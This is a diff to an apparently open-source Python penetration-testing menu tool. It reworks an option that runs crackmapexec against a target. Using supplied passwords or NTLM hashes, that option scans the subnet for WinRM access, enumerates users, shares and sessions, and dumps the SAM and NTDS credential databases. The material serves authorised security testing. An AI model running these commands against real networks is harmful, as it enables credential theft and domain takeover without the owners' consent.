@@ -2575,7 +2575,7 @@ while True:
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
-# Modified: N/A
+# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
 # -------------------------------------------------------------------------------------
 
    if selection =='60':
@@ -2589,51 +2589,67 @@ while True:
       
          if PAS[:2] != "''":
             checkParams = testFour("5985")            
+            
             if checkParams != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+               command("echo 'crackmapexec winrm " + TIP.rstrip(" ") + "/24' > bash.sh")
+               command("bash bash.sh")
                
             checkParams = testFour("445")
             if checkParams != 1:
-               print("\n[+] Checking priviliges...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -X 'whoami /all'")                  
+#               print("\n[+] Checking priviliges...\n")
+#               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -X whoami' > bash.sh")
+#               command("bash bash.sh")
                print("\n[+] Enumerating users...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")      
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating shares...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating sessions...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --sessions")            
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --sessions' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating SAM...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --sam")
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --sam' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating NTDS...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --ntds drsuapi")
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --ntds drsuapi' > bash.sh")
+               command("bash bash.sh")
+               command("rm bash.sh")
+               exit(1)
          else:
             print("[i] Using HASH value as password credential...")
             
             checkParams = testFour("5985")
             if checkParams != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+               command("echo 'crackmapexec winrm " + TIP.rstrip(" ") + "/24' > bash.sh")
+               command("bash bash.sh")
       
             checkParams = testFour("445")
             if checkParams != 1:
-               print("\n[+] Checking priviliges...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X 'whoami /all'")                     
+#               print("\n[+] Checking priviliges...\n")
+#               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X whoami /priv' > bash.sh")
+#               command("bash bash.sh")
                print("\n[+] Enumerating users...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating shares...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating sessions...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions")                        
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating SAM...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam")      
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam' > bash.sh")
+               command("bash bash.sh")
                print("\n[+] Enumerating NTDS...\n")
-               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
+               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi' > bash.sh")
+               command("bash bash.sh")
+               command("rm bash.sh")
+               exit(1)
 
-      try:
-         userInput = input("\nPress ENTER to continue...")
-      except EOFError as e:
-         print(e)
+      prompt()	# EOFError
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
